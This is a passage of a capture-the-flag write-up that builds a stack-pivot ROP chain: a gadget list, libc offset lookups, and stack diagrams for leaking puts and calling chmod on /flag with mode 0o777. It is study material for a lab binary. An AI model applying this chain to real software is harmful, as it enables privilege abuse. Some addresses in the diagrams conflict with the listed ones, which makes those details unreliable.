0x0000000000401522 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401312 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
0x00000000004023fc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401314 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
0x0000000000401594 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401628
0x000000000040165f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40168f
0x00000000004016dd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401706
0x0000000000402388 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000402389 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040129a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004023fe : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004011fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401316 : add byte ptr [rax], al ; jmp 0x401490
0x0000000000401596 : add byte ptr [rax], al ; jmp 0x401628
0x0000000000401661 : add byte ptr [rax], al ; jmp 0x40168f
0x00000000004016df : add byte ptr [rax], al ; jmp 0x401706
0x000000000040238a : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040129b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401299 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040238b : add cl, cl ; ret
0x000000000040122a : add dil, dil ; loopne 0x401295 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040129c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040130f : add eax, 0x3da8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
0x0000000000401297 : add eax, 0x3e1b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401717 : call qword ptr [rax + 0xff3c3c9]
0x00000000004014ac : call qword ptr [rax - 0x179a72b8]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401593 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401628
0x00000000004016dc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401706
0x00000000004012b3 : cli ; jmp 0x401240
0x0000000000401203 : cli ; ret
0x000000000040240b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401311 : cmp eax, 0 ; add byte ptr [rax], al ; jmp 0x401490
0x00000000004011fb : cmp eax, 0x90f40000 ; endbr64 ; ret
0x000000000040232c : cwde ; adc al, 0 ; add al, ch ; jmp 0x402320
0x00000000004016aa : dec ecx ; ret
0x00000000004012b0 : endbr64 ; jmp 0x401240
0x0000000000401200 : endbr64 ; ret
0x00000000004023dc : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040165e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40168f
0x00000000004011fe : hlt ; nop ; endbr64 ; ret
0x00000000004016d9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401706
0x000000000040165b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40168f
0x0000000000401527 : iretd
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401225 : je 0x401230 ; mov edi, 0x405090 ; jmp rax
0x0000000000401267 : je 0x401270 ; mov edi, 0x405090 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004012b4 : jmp 0x401240
0x0000000000401318 : jmp 0x401490
0x0000000000401598 : jmp 0x401628
0x0000000000401663 : jmp 0x40168f
0x0000000000401649 : jmp 0x401695
0x00000000004014ef : jmp 0x4016ab
0x00000000004016e1 : jmp 0x401706
0x0000000000402331 : jmp 0x402320
0x000000000040100b : jmp 0x4840104f
0x000000000040122c : jmp rax
0x00000000004014af : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000004016ab : leave ; ret
0x000000000040122d : loopne 0x401295 ; nop ; ret
0x0000000000401296 : mov byte ptr [rip + 0x3e1b], 1 ; pop rbp ; ret
0x000000000040165c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x40168f
0x00000000004016da : mov dword ptr [rbp - 4], 0 ; jmp 0x401706
0x0000000000401591 : mov dword ptr [rbp - 8], 0 ; jmp 0x401628
0x0000000000402387 : mov eax, 0 ; leave ; ret
0x0000000000401227 : mov edi, 0x405090 ; jmp rax
0x0000000000401590 : mov qword ptr [rbp - 8], 0 ; jmp 0x401628
0x00000000004011ff : nop ; endbr64 ; ret
0x0000000000401718 : nop ; leave ; ret
0x00000000004020e9 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x00000000004020ea : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x00000000004020eb : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x00000000004020ec : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x00000000004020ed : nop ; nop ; nop ; nop ; pop rbp ; ret
0x00000000004020ee : nop ; nop ; nop ; pop rbp ; ret
0x00000000004020ef : nop ; nop ; pop rbp ; ret
0x00000000004020f0 : nop ; pop rbp ; ret
0x0000000000401228 : nop ; push rax ; add dil, dil ; loopne 0x401295 ; nop ; ret
0x000000000040122f : nop ; ret
0x00000000004012ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401240
0x0000000000401226 : or dword ptr [rdi + 0x405090], edi ; jmp rax
0x00000000004023ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014b3 : pop r12 ; pop r13 ; pop rbp ; ret
0x00000000004023ee : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014b5 : pop r13 ; pop rbp ; ret
0x00000000004023f0 : pop r14 ; pop r15 ; ret
0x00000000004023f2 : pop r15 ; ret
0x00000000004023eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004023ef : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004014b6 : pop rbp ; pop rbp ; ret
0x000000000040129d : pop rbp ; ret
0x00000000004014b2 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000004023f3 : pop rdi ; ret
0x00000000004023f1 : pop rsi ; pop r15 ; ret
0x00000000004023ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014b4 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000401229 : push rax ; add dil, dil ; loopne 0x401295 ; nop ; ret
0x000000000040101a : ret
0x000000000040151f : ret 0x40be
0x0000000000402223 : ret 0x458b
0x0000000000402146 : ret 0x8948
0x00000000004014cf : ret 0x8be
0x000000000040221e : ret 0xf8c1
0x000000000040221b : ror byte ptr [rdi], 0x48 ; ret 0xf8c1
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401298 : sbb edi, dword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040240d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040240c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401310 : test al, 0x3d ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401223 : test eax, eax ; je 0x401230 ; mov edi, 0x405090 ; jmp rax
0x0000000000401265 : test eax, eax ; je 0x401270 ; mov edi, 0x405090 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 130
```

- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0`
- [ ] Offsets of required Libc functions
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x4023f3`
   - `pop rsi ; pop r15 ; ret`: `0x4023f1`
   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x4023ed`
- [x] Address of `_start()`: `0x4011d0`

#### Libc functions

Finally, lets find the offset of `puts` and `chmod` within Libc. This will be useful in the second stage of our exploit.

```
hacker@return-oriented-programming~pivotal-prelude-easy:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "puts"
   195: 0000000000084420   476 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5
   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
   505: 0000000000124550  1268 FUNC    GLOBAL DEFAULT   15 putspent@@GLIBC_2.2.5
   692: 0000000000126220   728 FUNC    GLOBAL DEFAULT   15 putsgent@@GLIBC_2.10
  1160: 0000000000082ce0   384 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
```

```
hacker@return-oriented-programming~pivotal-prelude-easy:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
```

- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0 + 16`
- [x] Offsets of required Libc functions
   - Offset of the `puts` symbol within Libc: `0x84420`
   - Offset of the `chmod` symbol within Libc: `0x10dd80`   
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x4023f3`
   - `pop rsi ; pop r15 ; ret`: `0x4023f1`
   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x4023ed`
- [x] Address of `_start()`: `0x4011d0`


### ROP chain: Stack pivot + ret2libc

#### Stage 1: Performing stack pivot & leaking the address of `puts` within Libc

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffefc892a08 │  00 00 00 00 00 40 23 ed  │ --> ( pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffefc892a10 │  00 00 00 00 00 41 50 f0  │ --> ( b"BBBBBBBB" + b"CCCCCCCC" + ..... in BSS )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffefc892a18 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffefc892a10 │  00 00 00 00 00 41 50 f0  │ --> ( b"BBBBBBBB" + b"CCCCCCCC" + ..... in BSS )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffefc892a18 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x4150f0 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x4150f8 │  43 43 43 43 43 43 43 43  │ ( b"CCCCCCCC" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415110 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r13 ; pop r14 ; pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x4150f8 │  43 43 43 43 43 43 43 43  │ ( b"CCCCCCCC" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415110 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
r13: b"BBBBBBBB"

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r14 ; pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415110 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
r13: b"BBBBBBBB"
r14" b"CCCCCCCC"

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415110 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
r13: b"BBBBBBBB"
r14" b"CCCCCCCC"
r15: b"DDDDDDDD"

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415110 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
r13: b"BBBBBBBB"
r14" b"CCCCCCCC"
r15: b"DDDDDDDD"

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x405028
r13: b"BBBBBBBB"
r14" b"CCCCCCCC"
r15: b"DDDDDDDD"

Function call setup:
puts(*puts@got)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x405028
r13: b"BBBBBBBB"
r14" b"CCCCCCCC"
r15: b"DDDDDDDD"

Function call setup:
puts(*puts@got)

═══════════════════════════════════════════════════════════════════════════════════
rip --> puts(*puts@got)
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x405028
r13: b"BBBBBBBB"
r14" b"CCCCCCCC"
r15: b"DDDDDDDD"

Function call setup:
puts(*puts@got)

═══════════════════════════════════════════════════════════════════════════════════
rip --> puts(*puts@got) return
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415128 │  .. .. .. .. .. .. .. ..  │ 
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> _start()
═══════════════════════════════════════════════════════════════════════════════════
```

We would have the address of `puts` within Libc by the end of this first stage, from which we can calculate the base address of Libc and the address of `chmod` within Libc. The call to `_start()` would restart the challenge, and give us a chance to execute the second stage.


#### Stage 2: Using leaked Libc puts address to calculate Libc chmod address

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffefc892a08 │  00 00 00 00 00 40 23 ed  │ --> ( pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffefc892a10 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... in BSS )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffefc892a18 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffefc892a10 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... in BSS )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffefc892a18 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x4150f0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x4150f8 │  43 43 43 43 43 43 43 43  │ ( b"CCCCCCCC" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415110 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... in BSS )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r13 ; pop r14 ; pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════     

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x4150f0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x4150f8 │  43 43 43 43 43 43 43 43  │ ( b"CCCCCCCC" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415110 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... in BSS )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
r13: b"/flag\x00\x00\x00"

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r14 ; pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════                

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x4150f8 │  43 43 43 43 43 43 43 43  │ ( b"CCCCCCCC" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415110 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... in BSS )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
r13: b"/flag\x00\x00\x00"
r14: b"CCCCCCCC"

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════     

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415110 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... in BSS )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
r13: b"/flag\x00\x00\x00"
r14: b"CCCCCCCC"
r15: b"DDDDDDDD"

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════    

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415110 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... in BSS )
